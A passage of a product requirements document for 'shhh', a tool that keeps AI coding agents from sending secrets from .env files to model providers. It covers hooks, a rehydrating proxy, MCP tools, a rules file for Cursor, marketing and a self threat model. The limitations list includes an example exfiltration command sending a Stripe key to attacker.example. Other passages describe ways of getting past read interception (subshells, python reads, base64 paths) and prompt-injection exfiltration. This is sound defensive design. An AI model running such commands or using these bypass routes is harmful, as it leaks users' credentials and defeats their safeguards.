Path-swapping a write operation is a silent data-loss bug. Either the agent writes to a redacted copy and the real file is never modified, or the Edit's `old_string` fails to match because it was itself redacted on read. Both outcomes are worse than a leak. shhh refuses:

```
stdin: { "tool": "Edit",
         "input": { "file_path": ".env",
                    "old_string": "STRIPE_KEY=sk_live_abc",
                    "new_string": "STRIPE_KEY=sk_live_xyz" } }
                │
                ▼
    Is file_path in sensitive patterns?
        │                        │
       YES                      NO
        │                        │
        ▼                        ▼
    Return deny decision:     Return empty (pass-through)
    {
      "decision": "deny",
      "reason": "shhh: refusing Edit on sensitive file (.env).
                  Editing a redacted copy would silently drop
                  the change on the real file.

                  To modify a secret safely:
                    shhh edit-secret .env STRIPE_KEY

                  To bypass this protection for this specific file:
                    shhh allow .env"
    }
```

The deny decision is surfaced to the user (and to the model) by Claude Code's hook protocol. The model sees the reason and can invoke `shhh edit-secret` via Bash on its next turn; the user sees the reason in the Claude Code UI.

**`shhh hook post-tool-use` — tool-result redaction:**

```
stdin: { "tool": "Bash", "output": "<stdout/stderr of the command>", ... }
                │
                ▼
    1. Fast membership check against session map (exact string match
       on all known secret values). O(n·m) naive; O(n+m) with Aho-Corasick
       for the eval corpus sizes.
    2. Detection pipeline on any remaining content for *new* secrets.
    3. New secrets added to the session map.
    4. Return { "output": "<redacted>" }
```

This is the catch-all for `cat $(...)`, subshells, `python -c "open('.env').read()"`, base64-encoded paths — anything that bypassed PreToolUse by executing outside of `Read`. The hook redacts the *output*, not the command, which is bounded and correct instead of an open-ended parsing exercise.

**Known limitations (documented, accepted):**
- Binary tool outputs (non-UTF-8) are not scanned; shhh logs a warning and passes them through. Binary key files (`*.pem`, `*.p12`, `*.jks`) are instead refused from Read entirely via the sensitive file globs.
- Very large outputs (>10MB default) are truncated before scanning; the tail is marked `[shhh: output truncated for scan — first 10MB scanned]`. Configurable in `config.toml`.
- If a secret is split across streaming chunks and PostToolUse is invoked per-chunk, the split secret may be missed. Claude Code delivers tool results as a single blob (not chunked), so this is a latent risk for other agents with streaming tool results and is documented per-integration.
- Side effects of the command itself cannot be undone. If Bash runs `curl https://attacker.example/log?k=$STRIPE_KEY` with a rehydrated value, Layer 2 proxy is the defense; Layer 1 sees it after the fact.

### 7.6 — Proxy implementation (Layer 2 reference)

**Architecture:** outbound redaction + inbound rehydration, both keyed on the shared session map.

```go
// Simplified proxy flow
func proxyHandler(w http.ResponseWriter, r *http.Request) {
    session := sessionFromRequest(r)  // session-scoped placeholder map

    // ---- OUTBOUND: redact messages before they reach the LLM ----
    body := readBody(r)
    messages := extractMessages(body)
    for i, msg := range messages {
        messages[i].Content = redactSecrets(msg.Content, session.Map)
    }
    upstreamResp := forwardToUpstream(r, replaceMessages(body, messages))

    // ---- INBOUND: rehydrate tool_use args before returning to the agent ----
    respBody := readBody(upstreamResp)
    toolUses := extractToolUses(respBody)  // e.g., bash commands, HTTP requests
    for i, tu := range toolUses {
        // Lookup each placeholder in tu.Input against the session map;
        // substitute the real value so local tool execution works.
        toolUses[i].Input = rehydrateValues(tu.Input, session.Map)
    }
    writeResponse(w, replaceToolUses(respBody, toolUses))
}
```

**Rehydration safety properties:**
- **Fails closed.** A placeholder-looking string that is not in the current session map is passed through unchanged. The model cannot coerce shhh into rehydrating arbitrary values by inventing placeholder strings.
- **Session-scoped.** Placeholders from a previous session or another user never resolve, even if they reach this daemon.
- **In-memory only.** The session map never touches disk. Daemon crash or restart discards it; the next session starts fresh.
- **Shared with Layer 1.** The hook and the proxy read/write the same in-memory map via a local Unix socket (`~/.config/shhh/daemon.sock`). A secret redacted by the hook in a file read can be rehydrated by the proxy when the model asks to use it in a bash command.

**Upstream routing:**
- Requests to `/v1/anthropic/*` → `https://api.anthropic.com/*`
- Requests to `/v1/openai/*` → `https://api.openai.com/*`
- Requests to `/v1/google/*` → `https://generativelanguage.googleapis.com/*`
- Custom upstream mapping configurable in `config.toml`.

**Proxy daemon management:**
```bash
shhh proxy start       # Start daemon (background)
shhh proxy stop        # Stop daemon
shhh proxy restart     # Restart
shhh proxy status      # PID, port, uptime, request count
```

Daemon uses a PID file at `~/.config/shhh/proxy.pid`. Logs to `~/.config/shhh/logs/proxy.log`.

### 7.7 — MCP server implementation (Layer 3 reference)

**Server:** Runs as stdio JSON-RPC process, launched by the IDE.

**Tools exposed:**

*File-reading tools:*

```typescript
{
  name: "read_sensitive_file",
  description: "Read a file that may contain secrets. Returns content with secrets replaced by semantic placeholders from the session map. Use this instead of the built-in Read tool for files like .env, credentials.json, *.pem, etc.",
  inputSchema: {
    type: "object",
    properties: {
      path: { type: "string", description: "Path to the file to read" }
    },
    required: ["path"]
  }
}

{
  name: "list_sensitive_files",
  description: "Scan a directory and list which files contain secrets. Returns file paths with secret counts and types.",
  inputSchema: {
    type: "object",
    properties: {
      directory: { type: "string", description: "Directory to scan" },
      recursive: { type: "boolean", default: true }
    },
    required: ["directory"]
  }
}
```

*Compensatory tools — let the agent extract information about a secret without seeing its value. Each one ships only when an eval task in §10.1 demonstrates it is necessary.*

```typescript
{
  name: "decode_jwt_safely",
  description: "Given a JWT placeholder ID, return the non-sensitive claims (alg, exp, iss, aud, scopes) without exposing the signature or the full token. Use this when you need to inspect a JWT's expiry, scopes, or issuer without seeing the raw token.",
  inputSchema: {
    type: "object",
    properties: {
      placeholder_id: { type: "string", description: "The placeholder ID shhh emitted for the JWT" }
    },
    required: ["placeholder_id"]
  }
}

{
  name: "compare_secrets",
  description: "Return true iff two placeholders refer to the same real secret value in the current session map. Use this to verify cross-file consistency (e.g., the STRIPE_KEY in .env matches the one in docker-compose.yml) without seeing the values.",
  inputSchema: {
    type: "object",
    properties: {
      placeholder_a: { type: "string" },
      placeholder_b: { type: "string" }
    },
    required: ["placeholder_a", "placeholder_b"]
  }
}

{
  name: "grep_hardcoded",
  description: "Search a directory for hardcoded occurrences of a secret by placeholder ID. Returns file:line matches. Use this for security audits: 'find all places where this API_KEY is hardcoded in the codebase.' The agent never sees the raw value.",
  inputSchema: {
    type: "object",
    properties: {
      placeholder_id: { type: "string" },
      directory: { type: "string" }
    },
    required: ["placeholder_id", "directory"]
  }
}

{
  name: "explain_secret",
  description: "Return metadata about a redacted secret (type, service, length, entropy bits, format validity) without revealing the value.",
  inputSchema: {
    type: "object",
    properties: {
      placeholder_id: { type: "string" }
    },
    required: ["placeholder_id"]
  }
}
```

**Rules file (installed alongside MCP):**

`.cursor/rules/shhh.md`:
```markdown
# shhh — Secret Protection Rules

When working with files that may contain secrets (`.env`, `credentials.*`, `*.pem`, `*.key`, 
config files with API keys or passwords), ALWAYS use the `read_sensitive_file` MCP tool 
from the `shhh` server instead of the built-in Read tool.

This ensures secrets are not sent to the LLM provider. The tool returns the file content 
with secrets replaced by semantic placeholders that you can reason about.

Example: Instead of seeing `STRIPE_KEY=sk_live_abc123`, you'll see 
`STRIPE_KEY=[STRIPE_LIVE_KEY:sk_live_...]` — you know it's a Stripe live key 
without seeing the actual value.
```

### 7.8 — Configuration file format

`~/.config/shhh/config.toml` (global) or `.shhh.toml` (project-level, overrides global):

```toml
[general]
log_level = "info"          # debug, info, warn, error
placeholder_style = "semantic"  # "semantic" (default), "generic" ([REDACTED]), "numbered" ([SECRET_1])

[proxy]
enabled = true
port = 8787
bind = "127.0.0.1"
# Custom upstream mappings
[proxy.upstreams]
anthropic = "https://api.anthropic.com"
openai = "https://api.openai.com"

[detection]
# Extra patterns (added to built-in gitleaks rules)
extra_patterns = [
  { name = "internal-token", pattern = "INTERNAL_[A-Z]+_TOKEN=.{16,}" }
]
# Entropy threshold
entropy_threshold = 4.5
entropy_min_length = 16

[files]
# Additional sensitive file patterns
extra_sensitive = [".secrets.yaml", "terraform.tfvars"]
# Files to ignore (false positives)
ignore = ["test/fixtures/.env.test", ".env.example"]
# Secrets to ignore by variable name
ignore_secrets = ["DATABASE_URL"]  # e.g., local dev DB with no real credentials

[integrations]
# Per-tool overrides
[integrations.claude-code]
enabled = true
scope = "global"            # "global" (settings.json) or "project" (settings.local.json)

[integrations.cursor]
enabled = true
install_rules = true        # Also install .cursor/rules/shhh.md

[integrations.proxy]
auto_start = true           # Start proxy daemon on `shhh init`
```

---

## 8. Installation & User Flows

### 8.1 — Distribution channels

| Channel | Command | Use case |
|---------|---------|----------|
| **npx (recommended)** | `npx shhh scan .` | Zero-install scan, quick test |
| **npm global** | `npm i -g shhh` | Persistent installation |
| **Homebrew** | `brew install shhh` | macOS native |
| **Curl installer** | `curl -fsSL https://shhh.dev/install.sh \| sh` | Linux servers, CI |
| **Go install** | `go install github.com/musubi-sasu/shhh@latest` | Go developers |
| **GitHub Releases** | Download binary | Manual install, air-gapped environments |

**Note on npx:** The npm package contains the Go binary for the appropriate platform (similar to how `esbuild` distributes). Alternatively, npx can download the binary on first run.

### 8.2 — User journey: The "branleur"

```
1. Sees tweet: "Holy shit, run `npx shhh scan .` in your project and see what 
   your AI agent is sending to OpenAI 😱"
   
2. Opens terminal in a project, runs `npx shhh scan .`
   → Sees 🔴 RED results: 4 secrets exposed
   → Screenshots the output
   → Stars the repo
   → Tweets the screenshot
   → Total time: 45 seconds
   
3. Maybe runs `npx shhh init`
   → TUI walks them through
   → Gets protection installed
   → Total time: 2 minutes
   
4. Forgets about it. Tool runs silently in the background.
   → Occasionally sees `shhh` interception logs when using Claude Code
   → Feels good about security
```

### 8.3 — User journey: The serious developer

```
1. Sees social proof (stars, tweets, HN post)
   
2. Reads the README properly
   → Understands the 3-layer architecture
   → Appreciates that it doesn't wrap their tools
   
3. Runs `shhh scan .` to evaluate
   → Verifies detection quality on their specific stack
   → Checks for false positives
   
4. Runs `shhh init` or `shhh install claude-code`
   → Inspects what was installed (checks settings.json)
   → Runs `shhh doctor` to verify
   
5. Uses daily
   → Runs `shhh status` occasionally
   → Adds custom rules for internal patterns
   → Configures `.shhh.toml` per project
   
6. Contributes
   → Reports false positives/negatives
   → Submits PRs for new detection patterns
   → Recommends to team
```

---

## 9. README & Marketing Strategy

### 9.1 — README structure (critical — this IS the product for adoption)

The README must follow these rules:
1. **Above the fold** (first screen without scrolling): name, tagline, one-liner install, screenshot of scan output.
2. **The scan command appears BEFORE the install section**. The scan is the hook.
3. **Install section uses `<details>` tags** with the most popular tool `open` by default.
4. **Zero jargon**. No "semantic redaction", no "defense in depth", no "entropy analysis". Those are for the docs site.
5. **The compatibility line** (`Works with Claude Code · Codex · Cursor · Windsurf · Aider · any tool`) appears in the first 3 lines.

### 9.2 — README template

```markdown
# 🤫 shhh

**Stop leaking secrets to AI agents.**

Your `.env` files are being sent to OpenAI, Anthropic, Google — every time
your coding agent reads them. **shhh** stops that.

Works with **Claude Code** · **Codex** · **Cursor** · **Windsurf** · **Aider** · any tool.

## See what you're leaking

\`\`\`bash
npx shhh scan .
\`\`\`

![shhh scan output](./docs/assets/scan-screenshot.png)

## Quick install

\`\`\`bash
npx shhh init
\`\`\`

Detects your tools, installs protection, runs first scan. 30 seconds.

## Manual install

<details open>
<summary>Claude Code</summary>

\`\`\`bash
npx shhh install claude-code
\`\`\`

Installs a native hook that intercepts file reads. Restart Claude Code.

</details>

<details>
<summary>Codex</summary>

\`\`\`bash
npx shhh install codex
\`\`\`

</details>

<details>
<summary>Cursor</summary>

\`\`\`bash
npx shhh install cursor
\`\`\`

Installs MCP server + rules file. Restart Cursor.

</details>

<details>
<summary>Windsurf</summary>

\`\`\`bash
npx shhh install windsurf
\`\`\`

</details>

<details>
<summary>Aider / any CLI tool</summary>

\`\`\`bash
npx shhh install proxy
\`\`\`

Starts a local proxy. Works with any tool that respects `ANTHROPIC_BASE_URL`
or `OPENAI_BASE_URL`.

</details>

## How it works

shhh replaces secrets with smart placeholders before they leave your machine:

\`\`\`diff
- STRIPE_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc
+ STRIPE_KEY=[STRIPE_LIVE_KEY:sk_live_...]

- DATABASE_URL=postgresql://admin:s3cret@prod-db:5432/myapp
+ DATABASE_URL=[POSTGRES_CONNSTRING:admin@prod-db:5432/myapp]
\`\`\`

Your AI agent still understands what each secret is — it just never sees the value.

## Commands

| Command | What it does |
|---------|-------------|
| `shhh scan .` | Show what's exposed in your project |
| `shhh init` | Auto-detect tools and install protection |
| `shhh install <tool>` | Install for a specific tool |
| `shhh status` | Check protection status |
| `shhh logs` | Watch interceptions in real time |
| `shhh doctor` | Troubleshoot integration issues |

## License

MIT
```

### 9.3 — Dynamic README strategy

The `<details open>` tag determines which tool is "featured" by default. This should track market sentiment:

- **Default**: Claude Code (largest hook ecosystem, strongest integration)
- **Switch trigger**: When another tool dominates Twitter/HN discourse, move the `open` attribute. This is a 1-line git diff.
- **Automated option** (stretch): A GitHub Action that checks Twitter API / HN API for tool mention volume and auto-PRs the README. Overkill but fun.

### 9.4 — Launch checklist

- [ ] Product Hunt launch post
- [ ] Hacker News "Show HN" post
- [ ] Twitter/X thread: "I ran `npx shhh scan .` on 10 popular open-source projects. Here's what I found." (with screenshots of scan results on well-known repos)
- [ ] Post on r/programming, r/ChatGPT, r/ClaudeAI, r/cursor
- [ ] File a comment on Claude Code issue #44868 linking shhh as a solution
- [ ] Demo video: 60 seconds, terminal only, scan → init → protected
- [ ] Blog post: "Your AI coding agent is sending your Stripe keys to OpenAI"

---

## 10. Development Phases

> **Timeline note.** The original PRD compressed Phase 1 to 2 weeks. Realistic solo-developer timelines are 2–3× that. Every phase below budgets for the esbuild-style cross-platform npm distribution (non-trivial), for CI, and for the documentation and eval work that make the product credible. Each phase document in `docs/` contains the full deliverable checklist, ship criterion, explicit out-of-scope list, and risk notes — the summary here is the index.

### Phase 0 — Eval Suite & Minimal Redactor (4 weeks, private)

**Goal:** Answer the central product question — *does semantic redaction preserve agent reasoning enough to be useful?* — with code and measurements, before committing to hooks, proxy, or IDE integrations. Worked in private until Phase 1 publication.

**Why private.** Publishing the tasks as a teaser before we have our own numbers would let a competitor post results first on our own benchmark. The narrative we want at Phase 1 is "I built the tool that measures the thing," not "I proposed a benchmark and someone ran it."

**Deliverables (summary):**
- Go CLI binary with `scan` and `redact` commands (no hooks, no proxy, no TUI).
- Gitleaks rules embedded; entropy detection; `.env` cross-reference with length/entropy gates.
- Session-deterministic placeholder map with in-memory store and salted session IDs.
- Rehydration function (inverse lookup by placeholder ID).
- MCP compensatory tool stubs: `decode_jwt_safely`, `compare_secrets`, `grep_hardcoded`, `explain_secret`.
- `shhh-eval` repository (private during Phase 0): product-agnostic harness, headless agent runner, 10 tasks across 3 tiers, 4 modes per task, n ≥ 10 runs per cell.
- Full baseline measurements across the 40-cell matrix, including the cells where shhh fails.

**Ship criterion:** the eval suite runs reproducibly on a fresh machine in one command and we have credible numbers for every cell. Bad numbers are publishable; missing numbers are not.

See `docs/phase-0-eval-suite.md` for the full plan, task catalog, and out-of-scope list.

### Phase 1 — Public Launch: Scan + Eval (3 weeks)

**Goal:** Ship `npx shhh scan .` publicly and simultaneously publish the eval repo with full baseline results. The narrative is "I built a redaction tool and here's how I measured whether it actually works."

**Deliverables (summary):**
- Public GitHub repos: `musubi-sasu/shhh` (the product) and `musubi-sasu/shhh-eval` (product-agnostic harness, MIT).
- `shhh scan` polished: screenshot-safe default output (`•••` masking), `--show-details` opt-in, JSON + Markdown formats.
- npm package with platform-specific binary (esbuild-style distribution — budget one week just for this).
- Homebrew tap and curl installer.
- README v1 with masked scan screenshot, honest compatibility matrix, link to eval results.
- `docs/eval-results.md`: the 40-cell matrix with discussion of what each task means, including tasks where shhh fails.
- `docs/threat-model.md`: the four threats from §1, what shhh defends against, what it doesn't.
- Launch content: Show HN, Twitter/X thread, Product Hunt, blog post framed around the eval (not around "secrets are scary").

**Ship criterion:** a developer can run `npx shhh scan .` and see masked output; a skeptic can clone `shhh-eval`, run `make bench`, and reproduce our numbers on their own machine.

See `docs/phase-1-scan-launch.md` for the full plan.

### Phase 2 — Architecture Decision (1 week)

**Goal:** Translate the eval results into a committed architecture. Small phase, high leverage.

**Decision points:**
- **Rehydration commitment.** If eval shows redact+rehydrate significantly beats redact-only on Tier 1 tasks (the expected outcome), commit to rehydration as the core engineering work for Phase 3+. If not, narrow the product to "read-only redaction" and document it explicitly.
- **Compensatory tool roadmap.** Which MCP tools ship, in what order, based on which eval tasks they unblock. Speculative tools are dropped.
- **Tier 1 tasks that still fail.** For each, pick one of: (a) engineering work to fix it in Phase 3+, (b) scope-out with documentation, (c) accept as a known limitation.
- **Threat-model pivot risk.** Revisit the "Anthropic/OpenAI build native" scenario against the eval numbers: does shhh's multi-tool value hold if one vendor ships native redaction?

**Deliverable:** an `ARCHITECTURE_DECISIONS.md` document in the repo with numbered ADRs, each citing the eval result that justifies the decision.

See `docs/phase-2-architecture-decision.md`.

### Phase 3 — Claude Code Integration (4 weeks)

**Goal:** Ship the native hook integration for Claude Code — the strongest and highest-leverage single integration.

**Deliverables (summary):**
- `shhh hook pre-read` (Read interception via path swap).
- `shhh hook refuse-if-sensitive` (Edit/Write/MultiEdit refusal with actionable error).
- `shhh hook post-tool-use` (tool-result redaction for Read/Bash/Grep/Glob, session-map consistent).
- `shhh edit-secret <file> <key>` (the safe-write escape hatch referenced by the refuse hook).
- Local daemon with Unix-socket session map, shared between hook invocations.
- `shhh install claude-code`, `shhh status`, `shhh doctor` (MVP versions).
- Eval tasks 1, 4, 5, 6 re-run against the real Claude Code integration in Docker; results published.

**Ship criterion:** a Claude Code user runs `shhh install claude-code`, restarts, and their `.env` files are redacted on read, Edit/Write is refused with a clear error, and eval task 6 (prompt-injection exfil) shows the real value no longer leaves the machine.

See `docs/phase-3-claude-code.md`.

### Phase 4 — Multi-tool Coverage (4 weeks)

**Goal:** Ship the proxy with rehydration and the MCP server with compensatory tools, extending coverage to Cursor, Aider, and any API-key CLI.

**Deliverables (summary):**
- HTTP reverse proxy daemon with outbound redaction and inbound rehydration of `tool_use` arguments.
- Session map shared between hook daemon and proxy daemon via Unix socket.
- MCP server (stdio JSON-RPC) implementing the file-reading tools and the compensatory tools that Phase 2 prioritized.
- `shhh install proxy`, `shhh install cursor`, `shhh install aider`, `shhh install codex`, `shhh install windsurf`.
- Real-time `shhh logs` command.
- Eval re-run across all integrations; cross-tool results published.

**Ship criterion:** all eval tasks pass (or are explicitly documented as scoped out) for Claude Code via hook, Cursor via MCP, and Aider via proxy. The compatibility matrix in the README is accurate.

See `docs/phase-4-multi-tool.md`.

### Phase 5 — TUI Installer & Polish (3 weeks)

**Goal:** Ship `shhh init` — the interactive TUI that auto-detects tools and installs everything.

**Deliverables (summary):**
- Tool auto-detection across Claude Code, Cursor, Codex, Windsurf, Aider.
- Interactive TUI (Bubble Tea) with checkboxes and post-install scan.
- `shhh uninstall <tool>` (symmetric with install — must cleanly revert).
- `.shhh.toml` project-level configuration with trust-on-first-use model (see §11 self threat model).
- `shhh add-rule`, `shhh ignore`, `shhh allow` commands.
- Comprehensive `shhh doctor` with all checks including hook-presence verification.
- README v2 with full documentation.

**Ship criterion:** a developer runs `npx shhh init`, gets walked through setup, and has full protection in under 90 seconds. `shhh uninstall` returns the system to its pre-shhh state.

See `docs/phase-5-tui-polish.md`.

### Phase 6 — Growth & Ecosystem (ongoing)

**Prioritized by community feedback and eval-revealed needs, not speculation:**
- `shhh scan --ci` mode for CI/CD (exit code on secrets found).
- GitHub Action: `musubi-sasu/shhh-action`.
- VS Code extension (status-bar protection indicator).
- Team configuration sharing (`.shhh.toml` in repo root with trust model).
- Pre-commit hook integration.
- New compensatory MCP tools as eval tasks reveal needs.
- Integration with secret managers (1Password, Bitwarden, Vault) for rotation recommendations.

**Anti-goals (explicit):**
- **No LLM-local enrichment in v1 or v2.** The original "local LLM for classification" idea is speculative, expensive, and not validated by any eval task. Shelved until an eval task demonstrates pattern-based labeling is insufficient.
- **No commercial features that lock the open-source path.** If monetization happens, it is additive (hosted dashboards, team management), not subtractive.

See `docs/phase-6-growth.md`.

---

## 11. Open Questions & Risks

### Technical risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| Claude Code hook API changes between versions | Medium | Pin to documented API, test against CC beta releases, graceful degradation (tool works without hook) |
| False positives (flagging non-secrets) | Medium | Conservative defaults, `shhh ignore` command, community-maintained exclusion lists |
| False negatives (missing secrets) | High | Layer defense (hook + proxy), gitleaks rules cover 95%+ of common patterns, entropy fallback for unknown patterns |
| Performance overhead on large files | Low | Only scan files matching sensitive patterns, skip binary files, cache detection results per session |
| Proxy TLS/certificate complexity | Medium | Start with HTTP-only proxy (works with BASE_URL override), defer MITM proxy (mitmproxy-style) to later |
| MCP soft enforcement unreliable | Known | Documented limitation, combine with proxy layer, advocate for IDE hook APIs |

### Market risks

| Risk | Severity | Response (not just mitigation) |
|------|----------|--------------------------------|
| Anthropic/OpenAI build native secret protection | High | **This is a pivot, not a free win.** If a single vendor ships native redaction, shhh's value shifts from "protection layer for this tool" to "unified layer across every tool the developer uses, with a shared session map enabling cross-tool consistency and a compensatory-tool surface." That pivot is defensible if (a) the multi-tool surface is genuinely used — which the eval suite can demonstrate on a cross-tool workflow — and (b) our detection and compensatory tools remain competitive. "Users win anyway" is not a business response; the real response is "our moat is multi-tool + eval-driven compensation, not the detection engine." |
| Tool ecosystem fragments further | Low | Architecture is agnostic by design. Adding a new tool is ~1 week of integration work per tool. |
| Rehydra expands to be truly multi-tool | Medium | Different positioning: shhh is scan-first CLI tool with a public eval suite; Rehydra is an SDK/library with a specific detection engine. We propose `shhh-eval` as a product-agnostic benchmark Rehydra can plug into — it becomes a standard we control without our product being prisoner of it. |
| Low adoption despite stars | Medium | Retention is measured explicitly in §12. Star-count alone is Phase-1 success; 7- and 30-day retention is Phase-1+ success. |

### Product questions to resolve

1. **Name**: Is "shhh" the final name? Check npm availability, domain availability (shhh.dev?), GitHub org. Consider alternatives if taken: `veil`, `shush`, `hush`, `cloak`, `redact`. Caveat: "shhh" is memorable but hard to type and hard to search — weigh against alternatives on retention, not just brand.
2. **npm package naming**: `shhh` if available, otherwise `@musubi/shhh` or `shhh-cli`.
3. **Go vs Rust**: Go is pragmatically better (HTTP proxy ecosystem, faster dev cycle, Bubble Tea for TUI). Rust only if performance is measurably a concern, which the eval will tell us.
4. **Gitleaks dependency**: Embed rules only, or embed the gitleaks detection engine? Rules-only is lighter but requires reimplementing the matching engine. Embedding gitleaks as a library is cleaner.
5. **Proxy authentication**: Bind to `127.0.0.1` only, plus a session token checked on every request to prevent local cross-user access on shared hosts.
6. **Telemetry**: Anonymous usage stats. Must be opt-in. The placeholder distinguishability measurement in eval task 7 directly informs how much residual signal an aggregated telemetry stream could leak about users — this is not just a product-taste question.
7. **License**: The license question is orthogonal to "star velocity" — pick based on what we want downstream. MIT maximizes adoption and third-party integration but allows proprietary forks. AGPL keeps the ecosystem open but discourages integration into closed-source IDEs. Recommendation: MIT for the CLI, with a separate AGPL-or-dual-license decision if we ever build hosted features.

### Self threat model (the security tool's own attack surface)

A secrets tool with no threat model for itself is a liability. The following attack surfaces are considered explicitly.

| Attack | Severity | Mitigation |
|--------|----------|------------|
| **Malicious `.shhh.toml` in a cloned repo** disables protection | High | Project-level config cannot disable protection entirely; it can only *add* ignores within a capped range, and only after an explicit `shhh trust .` on first encounter (recorded in `~/.config/shhh/trust.db`). Untrusted project configs are loaded in read-only lint mode. This is trust-on-first-use with a clear "what would change if you trust this" diff at the prompt. |
| **Prompt injection targeting the hook script** itself | Medium | Hook scripts read structured JSON over stdin and emit structured JSON; they never `eval`, shell-exec, or template any user-controlled content. File paths are passed to `os.Open` (not to a shell); file contents go to the detection pipeline (not to `eval`). |
| **Session map persisted and exfiltrated** | High | Session maps are in-memory only. Daemon crash discards the map. No disk, no swap file exposure (process uses `mlock` on the map region on Linux/macOS to prevent swap). |
| **Malicious MCP server impersonating shhh** | Medium | `shhh install cursor` writes a specific binary path and expected SHA into `.cursor/mcp.json`. `shhh doctor` verifies the installed binary hash on every invocation and warns loudly if it drifts. |
| **Rehydration side channel via tool_use echo** (the Rehydra-class problem) | High | Placeholders in `tool_use` inputs are matched strictly (exact session-salt suffix, exact format). A placeholder-looking string not in the current session map is passed through unchanged. The model cannot coerce shhh into rehydrating attacker-chosen strings. |
| **Binary secret files bypassing the text scanner** | Medium | Binary key formats (`.p12`, `.pfx`, `.jks`, `.pem`, `.key`) are *refused* from Read entirely via the sensitive file globs — not scanned and passed through. The agent cannot read a binary key through shhh at all; it must use a compensatory tool or be told to work without it. |
| **Hook API drift** silently breaking protection | High | `shhh status` and `shhh doctor` verify hook presence on every invocation. CI runs nightly against the Claude Code beta channel to detect upstream changes. A failed hook falls back to refusing sensitive file reads rather than silently passing them through. |
| **Placeholder leakage via aggregated telemetry** | Medium | Telemetry is opt-in, and the aggregate product signal (counts per secret type) is decoupled from any per-user identifiable placeholder content. The placeholder-distinguishability measurement in eval task 7 bounds the residual signal. |

---

## 12. Success Metrics

Metrics are organized by what they measure: **reach** (did the marketing work?), **retention** (did the product tick?), **quality** (is the protection real and the false-positive rate tolerable?). Reach alone is vanity; retention alone is invisible; quality alone is an engineering project. All three, tracked together, are the product.

### Reach (first 30 days of Phase 1 public launch)

These are legitimate Phase-1 goals given the viral acquisition strategy, not vanity metrics — Phase 1's literal job is the launch.

| Metric | Target | How to measure |
|--------|--------|----------------|
| GitHub stars | 2,000+ | GitHub API |
| npm weekly downloads | 5,000+ | npm stats |
| `shhh scan` executions | 10,000+ | Anonymous counter (opt-in) |
| HN front page | Yes | Manual check |
| Twitter impressions on launch thread | 100k+ | Twitter analytics |
| `shhh-eval` repo stars | 500+ | GitHub API (the eval is its own asset) |

### Retention (first 90 days)

This is what separates "a tweeted screenshot" from "a product."

| Metric | Target | How to measure |
|--------|--------|----------------|
| Scan → init conversion | ≥15% | Opt-in funnel counters |
| 7-day active install rate (init completers still running shhh) | ≥60% | Opt-in heartbeat (once/day, no content) |
| 30-day active install rate | ≥40% | Same |
| Median session count per retained user per week | ≥3 | Opt-in event counter |
| `shhh uninstall` rate (tool actively removed, not just abandoned) | <10% | Opt-in `uninstall` telemetry |

### Quality (continuous)

| Metric | Target | How to measure |
|--------|--------|----------------|
| False-positive rate on public-example corpus (eval task 8) | <5% | `shhh-eval` nightly run |
| Tier 1 eval task pass rate (tasks 1, 2, 3) | 100% by Phase 4 ship | `shhh-eval` nightly run |
| Tier 2 eval task pass rate (tasks 4, 5, 6, 7) | 100% by Phase 5 ship | `shhh-eval` nightly run |
| Time-to-detection-rule for newly disclosed secret formats | <7 days median | Issue tracker timestamps |
| Prompt-injection exfil leak rate on eval task 6 | 0% (real value never appears in outbound transcript) | `shhh-eval` nightly run |

### North star metric

**Weekly active installs with non-zero interception events.** This counts users for whom shhh fired at least once in the past 7 days — a proxy for "the product delivered real value this week." It is chosen specifically to *not* encourage false positives: adding fake detections to one user's project inflates their interception count but does not create a new weekly active install. A false-positive-heavy tool loses users rather than gains metric.

### Metrics that are explicitly *not* tracked

- **"Zero reported secret leaks through shhh."** Absence of evidence is not evidence of absence, and users don't report what they don't detect. This metric was in the original draft and is removed.
- **Total secrets intercepted per day (absolute count).** Encourages false positives; a single broken rule can 100× this number overnight without improving the product.
- **Lines of code in the detection engine.** LOC is not a product metric.

---

*This PRD is designed to be consumed by both humans and Claude Code. All technical decisions are implementation-ready. Start with Phase 0 — eval first, architecture second, shipping third.*